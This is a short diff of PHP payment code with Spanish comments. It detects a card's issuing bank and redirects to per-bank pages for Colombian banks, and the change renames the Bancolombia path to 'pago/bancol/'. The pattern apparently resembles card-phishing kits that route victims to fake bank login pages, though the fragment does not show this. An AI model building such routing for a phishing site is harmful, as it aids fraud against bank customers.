@@ -198,10 +198,10 @@ switch ($firstDigit) {
 
 // 6. DETERMINAR LA DIRECCIÓN DE REDIRECCIÓN SEGÚN EL BANCO DETECTADO
 $bancoNormalizado = strtolower($issuer);
-$redirectUrl = 'pago/bancolombia/'; // Default
+$redirectUrl = 'pago/bancol/'; // Default
 
 if (strpos($bancoNormalizado, 'bancolombia') !== false && strpos($bancoNormalizado, 'nequi') === false) {
-    $redirectUrl = 'pago/bancolombia/';
+    $redirectUrl = 'pago/bancol/';
 } elseif (strpos($bancoNormalizado, 'davivienda') !== false || strpos($bancoNormalizado, 'daviplata') !== false) {
     $redirectUrl = 'pago/davivienda/';
 } elseif (strpos($bancoNormalizado, 'bogot') !== false) {
